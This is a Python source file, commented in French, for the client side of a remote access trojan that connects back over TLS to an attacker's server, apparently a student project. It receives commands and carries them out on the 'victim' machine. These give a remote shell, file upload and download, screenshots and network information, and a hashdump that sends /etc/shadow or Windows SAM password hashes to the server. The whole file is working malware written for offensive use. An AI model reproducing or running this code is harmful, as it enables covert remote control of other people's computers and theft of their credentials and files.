import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv
from PIL import ImageGrab

import win32security
import win32con
import win32api
from winreg import ConnectRegistry, OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx

SERVER_PORT = 8888

# Fonction permettant d'envoyer la liste des commandes disponibles
def menu_help(ssl_socket):
    # Sauvegarde des explications du menu d'aides
    menu_help_to_send =  "[*] help        : afficher la liste des commandes disponibles.\n"
    menu_help_to_send += "[*] download    : récupération de fichiers de la victime vers le serveur.\n"
    menu_help_to_send += "[*] upload      : récupération de fichiers du serveur vers la victime.\n"
    menu_help_to_send += "[*] shell       : ouvrir un shell (bash ou cmd) interactif.\n"
    menu_help_to_send += "[*] ipconfig    : obtenir la configuration réseau de la machine victime.\n"
    menu_help_to_send += "[*] screenshot  : prendre une capture d'écran de la machine victime.\n"
    menu_help_to_send += "[*] search      : rechercher un fichier sur la machine victime.\n"
    menu_help_to_send += "[*] hashdump    : récupérer la base SAM ou le fichier shadow de la machine.\n"
    menu_help_to_send += "[*] exit        : quitter le programme et déconnexion de la machine victime."
    ssl_socket.send(menu_help_to_send.encode()) # Envoie du menu d'aides au serveur

# Fonction permettant d'envoyer un fichier au serveur
def download(ssl_socket):
    filename = ssl_socket.recv(4096).decode()
    
    disk_root = ("/")
    results_filename = []
    
    for root, dirs, files in os.walk(disk_root): # Recherche du fichier à la racine
        try:
            if filename in files:
                results_filename.append(os.path.join(root, filename))
                print(results_filename)
        
            if results_filename:
                results_to_send = "\n".join(f"      -> ({i + 1}: {path}" for i, path in enumerate(results_filename))
                ssl_socket.send(results_to_send.encode())
            
            else:
                ssl_socket.send(b"no results")
        except Exception as e:
            ssl_socket.send(f"Erreur: {str(e)}".encode)

# Fonction permettant de recevoir un fichier du serveur
def upload(ssl_socket):
    try:
        filename = ssl_socket.recv(4096).decode() # Réception du nom du fichier 
        with open(filename, 'wb') as file:
            while True:
                chunk = ssl_socket.recv(4096)
                if chunk.endswith(b'END'):
                    file.write(chunk[:-3])
                    break
                file.write(chunk)
    except Exception as e:
        return(f"Erreur lors de la réception du fichier")
        
# Fonction permettant d'accepter un shell depuis le serveur
def shell(ssl_socket):
    repertoire_actuel = os.getcwd()  # Stockage du répertoire actuel
    repertoire_actuel_to_send = f"[*] Répertoire actuel : {repertoire_actuel}"
    ssl_socket.send(repertoire_actuel_to_send.encode())
    while True:
        commande_shell_received = ssl_socket.recv(4096).decode()  # Récupération de la commande Shell du serveur
        if commande_shell_received.lower() == 'quit':  # Gestion de la sortie du Shell
            break
        elif commande_shell_received.lower() == 'help':
            commande_shell_to_send = f"[*] quit        : quiter le shell actif\n"
        elif commande_shell_received.lower().startswith('cd'):
            _, dossier = commande_shell_received.split(' ', 1) # Récupération du répertoire cible de la commande
            os.chdir(dossier)
            repertoire_actuel = os.getcwd() # Mise à jour du répertoire actuel
            commande_shell_to_send = f"[*] Changement de répertoire vers : {repertoire_actuel}\n"
        else:
            commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True, cwd=repertoire_actuel)  # Exécution de la commande Shell dans le répertoire actuel et stockage de ses sorties
            commande_shell_to_send = commande_shell.stdout + commande_shell.stderr  # Concaténation des sorties de la commande Shell
        ssl_socket.send(commande_shell_to_send.encode())  # Envoie de la réponse de la commande Shell

# Fonction permettant d'envoyer la configuration réseau au serveur
def ipconfig(ssl_socket):
    os_type = os.name  # Récupération du nom de l'OS de la machine
    if os_type == "posix":  # Test si la machine est une Linux
        conf = subprocess.run(['ip', 'a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ip a" et stockage de ses sorties
        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ip a"
    elif os_type == "nt":  # Test si la machine est une Windows
        conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ipconfig" et stockage de ses sorties
        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ipconfig"
    else:
        conf_to_send = "OS non reconnu" # Gestion d'erreur
    ssl_socket.send(conf_to_send.encode())  # Envoie de la configuration au serveur

# Fonction permettant d'envoyer la capture d'écran au serveur
def screenshot(ssl_socket):
    screenshot = ImageGrab.grab()  # Capture de l'écran
    screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
    with open('screenshot.png', 'rb') as screenshot_file:  # Ouverture de la capture d'écran
        while True:
            screenshot_to_send = screenshot_file.read(4096)  # Stockage des données de la capture d'écran
            if not screenshot_to_send:
                break
            ssl_socket.send(screenshot_to_send)  # Envoie de la capture d'écran
    ssl_socket.send(b'END')  # Envoie d'un délimiteur final

# Fonction permettant de localiser le fichier demandé par le serveur
def search(ssl_socket):
    recherche_received = ssl_socket.recv(4096).decode() # Récupération du nom du fichier à rechercher
    recherche = []
    for racine, dirs, dossiers in os.walk("/"): # Parcours du système de fichiers
        if recherche_received in dossiers:
            recherche.append(os.path.join(racine, recherche_received)) # Ajout du chemin du fichier trouvé aux résultats
    if recherche:
        recherche_to_send = "\n".join(recherche) # Concaténation des chemins des fichiers trouvés
    else:
        recherche_to_send = "Aucun fichier trouvé" # Gestion d'erreur
    ssl_socket.send(recherche_to_send.encode()) # Envoi des résultats de la recherche au serveur

# Fonction permettant d'envoyer le fichier shadow au serveur
def hashdump(ssl_socket):
    os_type = os.name  # Récupération du nom de l'OS de la machine
    if os_type == "posix":  # Test si la machine est une Linux
        with open('/etc/shadow', 'r') as fichier_shadow:  # Ouverture du fichier shadow
            hashdump_to_send = fichier_shadow.read()  # Lecture du contenu du fichier shadow
    elif os_type == "nt":  # Test si la machine est une Windows
        try:
            reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
            sam = OpenKey(reg, r"SAM\SAM\Domains\Account\Users")
            
            hashdump_to_send = ""
            for i in range(0, win32api.RegQueryInfoKey(sam)[0]):
                try:
                    key_name = win32api.RegEnumKey(sam, i)
                    user_key = OpenKey(sam, key_name)
                    user_value, _ = QueryValueEx(user_key, "V")
                    hashdump_to_send += f"{key_name}: {user_value}\n"
                except Exception as e:
                    hashdump_to_send += f"Erreur pour {key_name}: {str(e)}\n"
        except Exception as e:
            ssl_socket.send(f"Erreur lors de l'accès à la base SAM: {str(e)}".encode())
    else:
        hashdump_to_send = "OS non reconnu" # Gestion d'erreur
    ssl_socket.send(hashdump_to_send.encode())  # Envoie du fichier hashdump au serveur


def main():
    # Récupération des variables
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    # Création du contexte SSL pour la connexion au serveur
    context = ssl.create_default_context()
    context.check_hostname = False  # Désactivation de la vérification du nom d'hôte du serveur
    context.verify_mode = ssl.CERT_NONE  # Désactivation de la vérification du certificat SSL du serveur

    # Création du socket TCP pour la connexion au serveur
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)  # Enveloppement du socket avec SSL pour sécuriser la communication
    try: #modif
        ssl_socket.connect((ip_server, SERVER_PORT))  # Connexion au serveur en utilisant l'adresse IP et le port de connexion

    # Gestion des commandes reçues par le serveur
        while True:
            command = ssl_socket.recv(4096).decode()
            if command.lower() == 'help':
                menu_help(ssl_socket)
            elif command.lower().startswith('search'):
                search(ssl_socket)
            elif command.lower() == 'download':
                search(ssl_socket)#modif
                download(ssl_socket)
            elif command.lower() == 'upload':
                upload(ssl_socket)
            elif command.lower() == 'shell':
                shell(ssl_socket)
            elif command.lower() == 'ipconfig':
                ipconfig(ssl_socket)
            elif command.lower() == 'screenshot':
                screenshot(ssl_socket)
            elif command.lower() == 'hashdump':
                hashdump(ssl_socket)
            elif command.lower() == 'exit':
                break
    except Exception as e: #modif
        print(f"Erreur : {str(e)}")
    finally:        
        ssl_socket.close()
    #ssl_socket.close()  # Fermeture du socket

if __name__ == "__main__":
    main()
